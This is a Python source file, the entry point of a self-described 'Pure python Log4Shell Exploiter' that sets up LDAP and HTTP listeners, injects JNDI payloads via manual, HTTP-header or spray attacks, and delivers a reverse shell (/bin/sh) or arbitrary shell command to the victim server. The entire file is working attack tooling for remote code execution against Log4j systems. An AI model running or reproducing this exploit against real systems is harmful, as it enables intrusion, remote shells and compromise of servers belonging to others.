import argparse
import socket
import attacks
import payloads
from handlers import Sock
from logger import Logger, Color

logger = Logger('Main')


def quit(msg):
    logger.error(msg)
    exit(1)


def formatter_class(prog):
    return argparse.ArgumentDefaultsHelpFormatter(prog, max_help_position=80)


if __name__ == '__main__':
    attack_names = [c.__name__ for c in attacks.Attack.__subclasses__()]
    payload_names = [c.__name__ for c in payloads.JavaPayload.__subclasses__()]

    parser = argparse.ArgumentParser(description='Pure python Log4Shell Exploiter', formatter_class=formatter_class)
    parser.add_argument('--ip', default='auto', help='Callback ip that the victim server can reach you at')
    parser.add_argument('--ldap-port', default=49501, choices=range(1, 65536), metavar='{1..65535}', help='Port to listen at for the LDAP server')
    parser.add_argument('--http-port', default=49502, choices=range(1, 65536), metavar='{1..65535}', help='Port to listen at for the HTTP server')
    parser.add_argument('--attack', choices=attack_names, default='ManualAttack', help='Callback ip that the victim server can reach you at')
    parser.add_argument('--payload', choices=payload_names, default='ReverseShell', help='Java payload class to send')
    parser.add_argument('--once', action='store_true', help='If true, listeners will only listen for one connection then close')
    parser.add_argument('--specific-listener', action='store_true', help='If true, only listen on the specific --ip, else listen on 0.0.0.0')

    parser.add_argument('--list-attacks', action='store_true', help='List all available attacks')
    parser.add_argument('--list-payloads', action='store_true', help='List all available payloads')

    # Attack Manual
    pass
    # Attack HTTP Header
    parser.add_argument('--attack-http-header-method', default='GET', metavar='{GET, POST, OPTIONS, ...}', help='HTTP method to use for the HTTPHeaderAttack')
    parser.add_argument('--attack-http-header-header', metavar='HEADER_NAME', help='Header to inject the JNDI payload to')
    # Attack HTTP Spray
    pass

    # Payload Reverse Shell
    parser.add_argument('--payload-reverse-shell-port', default=49503, choices=range(1, 65536), metavar='{1..65535}', help='Port to listen at for the reverse shell payload')
    parser.add_argument('--payload-reverse-shell-shell', default='/bin/sh', metavar='SHELL', help='Shell to execute interactive commands with')
    # Payload Shell Command
    parser.add_argument('--payload-shell-command-cmd', metavar='CMD', help='Command to execute on the victim')

    args = parser.parse_args()
    Sock.once = args.once
    Sock.specific_listener = args.specific_listener

    if args.list_attacks:
        logger.info(f'Available attacks:')
        for c in attacks.Attack.__subclasses__():
            logger.info()
            logger.info(' - ' + c.__name__)
            logger.info('   ' + c.__doc__.strip())
        exit()
    if args.list_payloads:
        logger.info(f'Available payloads:')
        for c in payloads.JavaPayload.__subclasses__():
            logger.info()
            logger.info(' - ' + c.__name__)
            logger.info('   ' + c.__doc__.strip())
        exit()

    if args.ip == 'auto':
        logger.warn("Callback IP is set to 'auto'. Trying to identify local ips. This might fail or select the wrong local IP.")
        local_ips = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")]
        if len(local_ips) == 0:
            quit('No local IPs were identified.')
        logger.warn(f'Identified the following possible local IPs: {local_ips}. Using {Color.BOLD + Color.GREEN + local_ips[0]}')
        args.ip = local_ips[0]

    if args.payload == 'ReverseShell':
        payload = payloads.ReverseShell(args.ip, args.payload_reverse_shell_port, args.payload_reverse_shell_shell)
    elif args.payload == 'ShellCommand':
        payload = payloads.ShellCommand(args.payload_shell_command_cmd)
    else:
        quit(f'Unknown payload {args.payload}')

    if args.attack == 'ManualAttack':
        attack = attacks.ManualAttack(args.ip, payload, args.ldap_port, args.http_port)
    elif args.attack == 'HTTPHeaderAttack':
        attack = attacks.HTTPHeaderAttack(args.ip, payload, args.ldap_port, args.http_port, args.attack_http_header_method, args.attack_http_header_header)
    elif args.attack == 'HTTPShotgunAttack':
        attack = attacks.HTTPShotgunAttack(args.ip, payload, args.ldap_port, args.http_port)
    else:
        quit(f'Unknown attack {args.attack}')

    attack.attack()
